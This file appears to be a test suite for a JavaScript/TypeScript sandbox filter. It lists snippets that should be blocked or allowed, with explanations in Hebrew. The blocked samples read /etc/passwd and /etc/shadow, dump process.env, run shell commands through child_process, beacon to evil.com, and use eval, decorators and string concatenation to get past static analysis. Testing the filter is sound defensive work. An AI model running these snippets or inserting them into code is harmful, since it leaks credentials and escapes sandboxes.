/**
 * TypeScript Security Attack Vectors
 * 
 * TypeScript compiles to JavaScript, so it inherits all JS vulnerabilities.
 * These tests verify that malicious code is blocked regardless of TypeScript syntax.
 * 
 * Each test includes:
 * - name: Test identifier
 * - code: The malicious code attempt
 * - expectBlocked: Whether this should be blocked (true) or allowed (false)
 * - category: Attack category for grouping
 * - explanation: Human-readable description of how hackers use this attack
 */

export const typescriptTests = [
  // ════════════════════════════════════════════════════════════════
  // COMMAND EXECUTION ATTACKS
  // ════════════════════════════════════════════════════════════════
  {
    name: 'TS: Type-annotated child_process',
    code: `import { exec, ExecException } from 'child_process';
const callback = (err: ExecException | null, stdout: string) => console.log(stdout);
exec('whoami', callback);`,
    expectBlocked: true,
    category: 'command_execution',
    explanation: `
      🎯 מתקפה: ייבוא מודולים מסוכנים עם טיפוסים ב-TypeScript
      
      איך האקרים משתמשים בזה:
      ההערות והטיפוסים של TypeScript לא משנים את ההתנהגות בזמן ריצה.
      הוספת טיפוסים לייבואים מסוכנים לא הופכת אותם לבטוחים.
      
      השפעה בעולם האמיתי:
      - זהה למתקפות child_process ב-JavaScript
      - בטיחות טיפוסים אינה מספקת אבטחה
      - קוד ה-JavaScript שנוצר ירוץ בדיוק כמו קוד ללא טיפוסים
      
      תובנה חשובה:
      TypeScript היא SUPERSET של JavaScript - אם משהו מסוכן ב-JS,
      הוא מסוכן באותה מידה גם ב-TS. הטיפוסים נמחקים בזמן הקומפילציה.
    `,
  },
  {
    name: 'TS: Generic exec wrapper',
    code: `import { exec } from 'child_process';
function execute<T>(cmd: string): Promise<T> {
  return new Promise((resolve) => exec(cmd, (_, out) => resolve(out as T)));
}
execute<string>('id');`,
    expectBlocked: true,
    category: 'command_execution',
    explanation: `
      🎯 מתקפה: מעטפת Generic סביב פונקציות מסוכנות
      
      איך האקרים משתמשים בזה:
      עטיפת פונקציות מסוכנות ב-generics וב-Promises של TypeScript
      מטשטשת את הכוונה הזדונית, אבל שומרת על אותה יכולת פעולה.
      
      השפעה בעולם האמיתי:
      - ממשק עם טיפוסים להרצת פקודות
      - גורם לקוד זדוני להיראות כמו כלי עזר לגיטימי
      - טיפוס Generic עלול לבלבל סוקרי קוד
    `,
  },

  // ════════════════════════════════════════════════════════════════
  // FILE SYSTEM ATTACKS
  // ════════════════════════════════════════════════════════════════
  {
    name: 'TS: Typed fs operations',
    code: `import { readFileSync, PathLike } from 'fs';
const readConfig = (path: PathLike): string => readFileSync(path, 'utf8');
console.log(readConfig('/etc/passwd'));`,
    expectBlocked: true,
    category: 'file_system',
    explanation: `
      🎯 מתקפה: פעולות קבצים שנראות Type-Safe
      
      איך האקרים משתמשים בזה:
      הטיפוס PathLike של TypeScript גורם לגישה לקבצים להיראות לגיטימית,
      אבל הפעולה שמתבצעת מתחת עדיין מסוכנת.
      
      השפעה בעולם האמיתי:
      - קריאת קבצי מערכת רגישים עם טיפוסים תקינים
      - הקוד נראה יותר מקצועי וקל יותר לאישור בסקירה
      - אותן השלכות אבטחה כמו גישה ישירה ל-fs
    `,
  },
  {
    name: 'TS: fs with proper types',
    code: `import * as fs from 'fs';
interface FileContent { data: string; }
const content: FileContent = { data: fs.readFileSync('/etc/shadow', 'utf8') };`,
    expectBlocked: true,
    category: 'file_system',
    explanation: `
      🎯 מתקפה: חילוץ תוכן קבצים במבנה מוגדר
      
      איך האקרים משתמשים בזה:
      עטיפת תוכן קובץ גנוב בתוך interfaces עם טיפוסים גורמת לקוד
      להיראות כמו עיבוד נתונים לגיטימי.
      
      השפעה בעולם האמיתי:
      - /etc/shadow מכיל hashes של סיסמאות
      - יצירת payload מובנה להדלפת מידע
      - טיפוסים לא מאמתים ולא מנקים את התוכן
    `,
  },

  // ════════════════════════════════════════════════════════════════
  // NETWORK ATTACKS
  // ════════════════════════════════════════════════════════════════
  {
    name: 'TS: Typed HTTP request',
    code: `import * as https from 'https';
interface Response { statusCode?: number; }
https.get('https://evil.com/beacon', (res: Response) => console.log(res.statusCode));`,
    expectBlocked: true,
    category: 'network',
    explanation: `
      🎯 מתקפה: בקשות רשת עם Type Annotations
      
      איך האקרים משתמשים בזה:
      הוספת interfaces של TypeScript לבקשות רשת לא משנה
      את היכולת שלהן להדליף מידע או לשלוח beacon לשרתי C2.
      
      השפעה בעולם האמיתי:
      - יצירת קשר עם תשתית של התוקף
      - הדלפת מידע באמצעות payloads עם טיפוסים
      - טיפוס תקין הופך malware לקל יותר לתחזוקה
    `,
  },
  {
    name: 'TS: Async fetch with types',
    code: `interface ApiResponse { status: string; }
const beacon = async (): Promise<ApiResponse> => {
  const res = await fetch('https://evil.com/collect');
  return res.json();
};`,
    expectBlocked: true,
    category: 'network',
    explanation: `
      🎯 מתקפה: תקשורת רשת מודרנית עם async
      
      איך האקרים משתמשים בזה:
      async/await עם תגובות מטופסות גורם לקוד רשת זדוני
      להיראות כמו אינטגרציית API לגיטימית.
      
      השפעה בעולם האמיתי:
      - קוד הדלפה נקי ואסינכרוני
      - תקשורת C2 עם טיפוסים
      - תחזוקה קלה יותר של תשתית התקיפה
    `,
  },

  // ════════════════════════════════════════════════════════════════
  // SYSTEM ACCESS ATTACKS
  // ════════════════════════════════════════════════════════════════
  {
    name: 'TS: Process env with interface',
    code: `interface EnvVars { [key: string]: string | undefined; }
const env: EnvVars = process.env;
console.log(JSON.stringify(env));`,
    expectBlocked: true,
    category: 'system_access',
    explanation: `
      🎯 מתקפה: גישה למשתני סביבה עם טיפוסים
      
      איך האקרים משתמשים בזה:
      יצירת interfaces עבור process.env מאפשרת לחלץ
      את כל משתני הסביבה בפורמט מובנה.
      
      השפעה בעולם האמיתי:
      - גניבת כל משתני הסביבה בבת אחת
      - JSON.stringify מאפשר הדלפה קלה
      - מפתחות AWS, סיסמאות בסיסי נתונים, טוקנים ל-API
    `,
  },
  {
    name: 'TS: OS info with types',
    code: `import * as os from 'os';
interface SystemInfo { hostname: string; user: string; }
const info: SystemInfo = { hostname: os.hostname(), user: os.userInfo().username };`,
    expectBlocked: true,
    category: 'system_access',
    explanation: `
      🎯 מתקפה: איסוף מידע מערכת בצורה מובנית
      
      איך האקרים משתמשים בזה:
      איסוף מידע מערכת לתוך אובייקטים עם טיפוסים יוצר
      fingerprint נקי של מערכת היעד.
      
      השפעה בעולם האמיתי:
      - סריקת מערכת לצורך תקיפות ממוקדות
      - זיהוי מטרות בעלות ערך גבוה
      - בניית פרופילי מערכת לצורך ניצול חולשות
    `,
  },

  // ════════════════════════════════════════════════════════════════
  // TYPE SYSTEM ABUSE ATTACKS
  // ════════════════════════════════════════════════════════════════
  {
    name: 'TS: Type assertion bypass',
    code: `const dangerous = 'child_process' as const;
const exec = require(dangerous as string);`,
    expectBlocked: true,
    category: 'type_abuse',
    explanation: `
      🎯 מתקפה: Type Assertion כדי להתחמק מסינון
      
      איך האקרים משתמשים בזה:
      Type assertions של TypeScript כמו as const או as string קיימים רק בזמן קומפילציה.
      הם יכולים לגרום לקוד להיראות שונה, אבל לייצר אותה התנהגות בזמן ריצה.
      
      השפעה בעולם האמיתי:
      - עקיפת מנתחי AST שלא מבינים TypeScript
      - הקשחת ניתוח סטטי של הקוד
      - ההתנהגות בזמן ריצה אינה משתנה
    `,
  },
  {
    name: 'TS: Any type bypass',
    code: `const getModule = (name: any) => require(name);
getModule('child_process').exec('id');`,
    expectBlocked: true,
    category: 'type_abuse',
    explanation: `
      🎯 מתקפה: שימוש ב-any כדי להסתיר פעולות מסוכנות
      
      איך האקרים משתמשים בזה:
      הטיפוס any מבטל את בדיקות הטיפוסים של TypeScript,
      ומאפשר לכל ערך לעבור בלי שגיאות בזמן קומפילציה.
      
      השפעה בעולם האמיתי:
      - עקיפת הבטחות הבטיחות של TypeScript
      - טעינת מודולים דינמית בלי שגיאות טיפוס
      - מקשה על ניתוח סטטי של הקוד
    `,
  },
  {
    name: 'TS: Generic type escape',
    code: `function loadModule<T>(name: string): T { return require(name) as T; }
const cp = loadModule<{ exec: Function }>('child_process');
cp.exec('whoami');`,
    expectBlocked: true,
    category: 'type_abuse',
    explanation: `
      🎯 מתקפה: פונקציות Generic לטעינת מודולים
      
      איך האקרים משתמשים בזה:
      Generics מאפשרים לכתוב פונקציות שיכולות להחזיר כל טיפוס,
      כך שגישה למודולים מסוכנים נראית כמו כלי עזר Type-Safe.
      
      השפעה בעולם האמיתי:
      - מעטפת עם טיפוסים סביב require()
      - קוד תקיפה שניתן להשתמש בו שוב
      - קשה יותר לזהות את הכוונה הזדונית
    `,
  },

  // ════════════════════════════════════════════════════════════════
  // DECORATOR ABUSE ATTACKS
  // ════════════════════════════════════════════════════════════════
  {
    name: 'TS: Class with malicious decorator',
    code: `function malicious(target: any) { require('child_process').exec('id'); }
@malicious
class Victim {}`,
    expectBlocked: true,
    category: 'decorator_abuse',
    explanation: `
      🎯 מתקפה: הרצת קוד באמצעות Decorator
      
      איך האקרים משתמשים בזה:
      Decorators ב-TypeScript רצים בזמן הגדרת המחלקה.
      Decorator זדוני יכול להריץ קוד רק מעצם זה שהוא מוצמד למחלקה.
      
      השפעה בעולם האמיתי:
      - הרצת קוד כשהמודול נטען
      - הסתרת הרצה בתוך פונקציות decorator
      - נפוץ בפריימוורקים לגיטימיים, ולכן קל יותר להסתיר malware
    `,
  },
  {
    name: 'TS: Method decorator attack',
    code: `function evil(target: any, key: string, desc: PropertyDescriptor) {
  require('fs').readFileSync('/etc/passwd');
}
class A { @evil method() {} }`,
    expectBlocked: true,
    category: 'decorator_abuse',
    explanation: `
      🎯 מתקפה: Method Decorator לגישה לקבצים
      
      איך האקרים משתמשים בזה:
      Method decorators רצים כשהמחלקה מוגדרת, לא כשהמתודה נקראת.
      זה מאפשר הרצת קוד מוקדמת.
      
      השפעה בעולם האמיתי:
      - הרצה לפני שהקוד הראשי מתחיל
      - קריאת קבצים בזמן import או הגדרת מחלקה
      - תבנית decorator נפוצה ולכן פחות חשודה
    `,
  },

  // ════════════════════════════════════════════════════════════════
  // INTERFACE/TYPE DEFINITION ATTACKS
  // ════════════════════════════════════════════════════════════════
  {
    name: 'TS: Dynamic property access',
    code: `const global: { [key: string]: any } = globalThis;
const p = global['pro' + 'cess'];
console.log(p.env);`,
    expectBlocked: true,
    category: 'type_abuse',
    explanation: `
      🎯 מתקפה: Index Signature לגישה דינמית
      
      איך האקרים משתמשים בזה:
      Index signatures ב-TypeScript מאפשרים להשתמש בכל string כמפתח מאפיין.
      בשילוב עם חיבור מחרוזות, זה עוקף ניתוח סטטי.
      
      השפעה בעולם האמיתי:
      - גישה דינמית למאפיינים חסומים
      - Index signature מחליש אבטחה מבוססת טיפוסים
      - ההתנהגות בזמן ריצה זהה ל-JavaScript
    `,
  },

  // ════════════════════════════════════════════════════════════════
  // EVAL AND CODE INJECTION
  // ════════════════════════════════════════════════════════════════
  {
    name: 'TS: Typed eval wrapper',
    code: `function safeEval<T>(code: string): T { return eval(code) as T; }
safeEval<void>("require('child_process').exec('id')");`,
    expectBlocked: true,
    category: 'code_injection',
    explanation: `
      🎯 מתקפה: מעטפת Eval שנראית Type-Safe
      
      איך האקרים משתמשים בזה:
      עטיפת eval בפונקציה עם טיפוסים לא הופכת אותו לבטוח.
      ה-type assertion נמחק בזמן הקומפילציה.
      
      השפעה בעולם האמיתי:
      - השם "safeEval" מטעה
      - Type assertions לא מאמתים ולא מנקים קוד
      - אותן בעיות אבטחה כמו eval רגיל
    `,
  },
  {
    name: 'TS: Function constructor with types',
    code: `type ExecFn = () => void;
const fn: ExecFn = new Function("require('fs').readFileSync('/etc/passwd')") as ExecFn;
fn();`,
    expectBlocked: true,
    category: 'code_injection',
    explanation: `
      🎯 מתקפה: Function Constructor עם טיפוסים
      
      איך האקרים משתמשים בזה:
      ה-Function constructor יוצר פונקציות ממחרוזות, בדומה ל-eval.
      הוספת טיפוסים לא משנה את ההתנהגות המסוכנת הזו.
      
      השפעה בעולם האמיתי:
      - הרצת קוד דינמית עם אשליית בטיחות טיפוסים
      - לעיתים מפוספס על ידי מנתחים שמבינים TypeScript
      - Type assertion מסתיר את הסכנה
    `,
  },

  // ════════════════════════════════════════════════════════════════
  // PROTOTYPE POLLUTION IN TYPESCRIPT
  // ════════════════════════════════════════════════════════════════
  {
    name: 'TS: Object prototype pollution',
    code: `interface Polluted { polluted?: string; }
(Object.prototype as Polluted).polluted = 'pwned';
const obj: Polluted = {};
console.log(obj.polluted);`,
    expectBlocked: true,
    category: 'prototype_pollution',
    explanation: `
      🎯 מתקפה: Prototype Pollution עם טיפוסים
      
      איך האקרים משתמשים בזה:
      TypeScript מאפשר לשנות את Object.prototype דרך type assertions.
      הזיהום משפיע על כל האובייקטים בזמן ריצה.
      
      השפעה בעולם האמיתי:
      - זהה ל-prototype pollution ב-JavaScript
      - Interface גורם לזיהום להיראות מכוון ולגיטימי
      - מערכת הטיפוסים לא מונעת שינוי prototype
    `,
  },

  // ════════════════════════════════════════════════════════════════
  // NAMESPACE/MODULE ATTACKS
  // ════════════════════════════════════════════════════════════════
  {
    name: 'TS: Namespace with malicious code',
    code: `namespace Malware {
  export const run = () => require('child_process').exec('id');
}
Malware.run();`,
    expectBlocked: true,
    category: 'command_execution',
    explanation: `
      🎯 מתקפה: Malware שמוסתר בתוך Namespace
      
      איך האקרים משתמשים בזה:
      Namespaces ב-TypeScript מארגנים קוד, אבל לא מספקים בידוד.
      קוד זדוני בתוך namespace רץ כרגיל.
      
      השפעה בעולם האמיתי:
      - ארגון malware בתוך namespaces
      - נראה כמו ספריות עזר לגיטימיות
      - Namespace לא יוצר sandbox לקוד
    `,
  },
  {
    name: 'TS: Module augmentation attack',
    code: `declare module 'child_process' { export function exec(cmd: string): void; }
import { exec } from 'child_process';
exec('id');`,
    expectBlocked: true,
    category: 'command_execution',
    explanation: `
      🎯 מתקפה: הצהרת מודול יחד עם שימוש מסוכן
      
      איך האקרים משתמשים בזה:
      Module augmentation נראה כמו הצהרות טיפוסים,
      אבל כאן הוא כולל גם import אמיתי ושימוש במודולים מסוכנים.
      
      השפעה בעולם האמיתי:
      - הצהרה ושימוש במודולים מסוכנים יחד
      - נראה כמו קובץ הגדרות טיפוסים
      - import והרצה אמיתיים מתבצעים בפועל
    `,
  },

  // ════════════════════════════════════════════════════════════════
  // SAFE CODE
  // ════════════════════════════════════════════════════════════════
  {
    name: 'TS: Safe typed function',
    code: `const add = (a: number, b: number): number => a + b; console.log(add(2, 3));`,
    expectBlocked: false,
    // Note: expectedOutput removed - TypeScript requires transpilation which is separate from security
    category: 'safe_code',
    explanation: `
      ✅ בטוח: פונקציה מתמטית עם טיפוסים
      
      זה קוד לגיטימי שלא צריך להיחסם:
      פונקציות עם type annotations שמבצעות פעולות בטוחות
      הן בדיוק מה ש-TypeScript נועד לעשות.
      
      הערה: הרצה בפועל דורשת transpilation של TypeScript,
      וזה עניין של runtime שנפרד מסינון אבטחתי.
    `,
  },
  {
    name: 'TS: Safe interface usage',
    code: `interface Point { x: number; y: number; }
const p: Point = { x: 10, y: 20 };
console.log(p.x + p.y);`,
    expectBlocked: false,
    category: 'safe_code',
    explanation: `
      ✅ בטוח: מבני נתונים מבוססי Interface
      
      זה קוד לגיטימי שלא צריך להיחסם:
      הגדרה ושימוש ב-interfaces לצורך בטיחות טיפוסים
      הם חלק מרכזי מ-TypeScript.
    `,
  },
  {
    name: 'TS: Safe generic function',
    code: `function identity<T>(value: T): T { return value; }
console.log(identity('hello'));`,
    expectBlocked: false,
    category: 'safe_code',
    explanation: `
      ✅ בטוח: פונקציית Generic מסוג Identity
      
      זה קוד לגיטימי שלא צריך להיחסם:
      Generics ללא פעולות מסוכנות הם בטוחים
      ומהווים בסיס חשוב בפיתוח TypeScript.
    `,
  },
  {
    name: 'TS: Safe class with methods',
    code: `class Calculator {
  add(a: number, b: number): number { return a + b; }
}
const calc = new Calculator();
console.log(calc.add(5, 3));`,
    expectBlocked: false,
    category: 'safe_code',
    explanation: `
      ✅ בטוח: מחלקה עם מתודות מטופסות
      
      זה קוד לגיטימי שלא צריך להיחסם:
      TypeScript מונחה עצמים עם טיפוסים תקינים
      הוא פרקטיקה סטנדרטית בפיתוח אפליקציות.
    `,
  },
  {
    name: 'TS: Safe enum usage',
    code: `enum Color { Red, Green, Blue }
console.log(Color.Green);`,
    expectBlocked: false,
    category: 'safe_code',
    explanation: `
      ✅ בטוח: הגדרה ושימוש ב-Enum
      
      זה קוד לגיטימי שלא צריך להיחסם:
      Enums הם יכולת של TypeScript להגדרת
      קבועים בעלי שמות. בטוח לחלוטין.
    `,
  },
];
